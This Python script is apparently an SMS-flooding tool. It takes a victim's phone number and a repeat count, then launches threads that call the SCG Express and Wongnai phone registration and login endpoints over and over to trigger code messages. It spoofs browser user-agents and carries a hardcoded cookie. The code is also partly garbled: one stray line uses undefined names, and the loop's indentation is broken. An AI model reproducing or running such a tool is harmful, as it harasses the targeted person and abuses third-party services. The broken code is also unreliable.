import requests
import threading
from threading import Thread
import time
import colorama
import random
import os

def cls():
    try:
        os.system("cls")
    except:
        os.system("clear")

phone = input("PHONE : ")
NUM = int(input("NUM : "))

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}

def api1():
    requests.get(f"https://www.scgexpress.co.th/member/getRegister?phone={phone}")

def api2():
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
        "cookie": "_gcl_au=1.1.1123274548.1637746846"
        }
    requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")

        send = session.post(url,data=data,headers=headers).json()
    
aaa = time.time()
for i in range(NUM):
    time.sleep(0)
    bytes = random.randint(100,999)
    threading.Thread(target=api1).start()
    print('\33[33m| api','1','| PHONE %s |'%(phone))
        threading.Thread(target=api2).start()
    print('\33[33m| api','2','| PHONE %s |'%(phone))
    bbb = time.time()
    
    ccc = bbb - aaa
print("เวลาในการรันสคริป",ccc)